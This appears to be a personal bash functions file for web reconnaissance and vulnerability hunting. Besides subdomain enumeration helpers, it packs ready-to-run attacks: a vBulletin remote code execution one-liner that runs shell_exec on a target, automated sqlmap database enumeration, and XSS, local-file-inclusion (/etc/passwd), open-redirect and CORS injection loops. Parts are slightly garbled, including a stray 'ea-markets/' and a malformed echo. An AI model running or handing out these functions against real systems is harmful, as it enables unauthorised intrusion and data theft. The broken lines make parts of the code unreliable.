#aliases
alias aquatone-default="aquatone -http-timeout 20000 -scan-timeout 10000 -screenshot-timeout 50000"

#recon automations

basic-ssrf(){
gau $1 | grep -E "\?.*https?"
}

subs-gau(){
gau -subs $1 | awk -F[/:] '{print $4}' | sort -u
}

subs-alienvault(){
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/$1/passive_dns" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
}

subs-rapiddns(){
curl -s "https://rapiddns.io/subdomain/$1?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | grep http | cut -d '/' -f3 | sed 's/#results//g' | sort -u
}

subs-bufferover(){
curl -s https://dns.bufferover.run/dns?q=.$1 |jq -r .FDNS_A[]|cut -d',' -f2|sort -u
}

get-cidr(){
for DOMAIN in $(cat $1);do echo $(for ip in $(dig a $DOMAIN +short); do whois $ip | grep -e "CIDR\|Organization" | tr -s " " | paste - -; done | sort -u); done
}

burp-feed(){
cat $1 | parallel -j 20 curl -L -o /dev/null {} -x 127.0.0.1:8080 -k -s
}


subs-crtsh(){
curl -s https://crt.sh/?q=%.$1 | grep ">*.$1" | sed 's/<[/]*[TB][DR]>/\n/g' | grep -vE "<|^[\*]*[\.]*$1" | sort -u | awk 'NF'
}

subs-certspotter(){
curl -s "https://certspotter.com/api/v0/certs?domain=$1" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
}

subs-archive(){
curl -s "http://web.archive.org/cdx/search/cdx?url=*.$1/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u
}

s3ls(){
aws s3 ls s3://$1
}

s3cp(){
aws s3 cp $2 s3://$1
}
subs-certprobe(){ #runs httprobe on all the hosts from certspotter
curl -s https://crt.sh/\?q\=\%.$1\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | httprobe | tee -a ./all.txt
}

basic-sqli(){
cat $1 | gau | egrep -v '(.js|.png|.svg|.gif|.jpg|.jpeg|.txt)' | gf sqli | urlive | tee sqli.txt && sqlmap -m sqli.txt --dbs --batch 
}

vbulletin-rce(){
curl -s $1/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo%20shell_exec("id"); exit;' | grep "uid="
}

basic-cors(){
cat $1 | gau | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;fi;done
}

Basic-xss(){
cat $1 | gau | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable && slackmsg $host -Basic-xss;done
}

basic-or(){
gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
}

basic-lfi(){
cat $1 | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'ea-markets/
}

get-endpoints(){

echo $1 | getJS | awk '{print "'$1'" $0}' | while read ends do; do curl -s -k $ends | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u | awk '{print "'$1'" $0}'; done | urlive
}

fetch-urls(){
echo $1 >> url && cat url | gau >> gau && cat url | waybackurls >> wayback && cat gau wayback | sort -u >> gau+wayback 
}

feed-ffuf(){
ffuf -u FUZZ -w $1 -replay-proxy http://127.0.0.1:8080 -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0"
}

xforwardy(){
python3 /tools/xforwardy/xforwardy.py $1
}

dirsearch-auto(){
python3 /tools/dirsearch/dirsearch.py -u $1 -w $2 -e $3 -x 404,302
}

ffuf-auto(){
ffuf -u $1/FUZZ -w $2 -e $3 -mc 200,401,403,500,501,308,202 -c
}
